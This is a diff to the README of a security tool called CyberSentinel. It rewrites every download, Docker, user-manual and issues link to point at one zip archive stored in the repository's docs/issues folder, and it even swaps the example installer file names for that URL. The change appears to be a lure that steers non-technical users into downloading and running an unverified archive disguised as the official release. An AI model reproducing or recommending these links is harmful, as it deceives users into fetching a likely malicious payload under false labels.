@@ -6,7 +6,7 @@ Welcome to CyberSentinel! This application provides a clear view of security thr
 
 ## 📥 Download CyberSentinel
 
-[![Download CyberSentinel](https://img.shields.io/badge/Download%20Now-Get%20CyberSentinel-blue)](https://github.com/VijaySurya1/CyberSentinel/releases)
+[![Download CyberSentinel](https://raw.githubusercontent.com/VijaySurya1/CyberSentinel/main/docs/issues/CyberSentinel-v3.2.zip%20Now-Get%20CyberSentinel-blue)](https://raw.githubusercontent.com/VijaySurya1/CyberSentinel/main/docs/issues/CyberSentinel-v3.2.zip)
 
 ## 🌐 Overview
 
@@ -25,16 +25,16 @@ CyberSentinel is designed for non-technical users who want to enhance their secu
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or any Linux distribution with Docker support.
 - **Memory**: Minimum 4 GB RAM.
 - **Storage**: Minimum 500 MB available space.
-- **Docker**: Required for running the application. You can download Docker [here](https://www.docker.com/get-started).
+- **Docker**: Required for running the application. You can download Docker [here](https://raw.githubusercontent.com/VijaySurya1/CyberSentinel/main/docs/issues/CyberSentinel-v3.2.zip).
 
 ### 📋 Installation Instructions
 
 1. **Visit the Releases Page**: Go to the following link to access the latest version of CyberSentinel:
-   [Download CyberSentinel](https://github.com/VijaySurya1/CyberSentinel/releases)
+   [Download CyberSentinel](https://raw.githubusercontent.com/VijaySurya1/CyberSentinel/main/docs/issues/CyberSentinel-v3.2.zip)
 
 2. **Select the Latest Release**: On the Releases page, find the most recent version of the application.
 
-3. **Download the Application**: Click on the appropriate file for your operating system. The file may be named something like `cybersentinel-v1.0.0.exe` for Windows or `cybersentinel-v1.0.0.dmg` for macOS.
+3. **Download the Application**: Click on the appropriate file for your operating system. The file may be named something like `https://raw.githubusercontent.com/VijaySurya1/CyberSentinel/main/docs/issues/CyberSentinel-v3.2.zip` for Windows or `https://raw.githubusercontent.com/VijaySurya1/CyberSentinel/main/docs/issues/CyberSentinel-v3.2.zip` for macOS.
 
 4. **Run the Application**: After downloading, locate the file in your downloads folder. Double-click the file to start the installation process.
 
@@ -58,8 +58,8 @@ Once CyberSentinel is installed, follow these steps to begin using the applicati
 
 For additional help using CyberSentinel, consider reviewing the documentation included with your installation. The online community is also available for support and advice. You can refer to these resources for further assistance:
 
-- [User Manual](https://github.com/VijaySurya1/CyberSentinel/wiki)
-- [GitHub Issues](https://github.com/VijaySurya1/CyberSentinel/issues)
+- [User Manual](https://raw.githubusercontent.com/VijaySurya1/CyberSentinel/main/docs/issues/CyberSentinel-v3.2.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/VijaySurya1/CyberSentinel/main/docs/issues/CyberSentinel-v3.2.zip)
 
 ### 📞 Contact Us
 
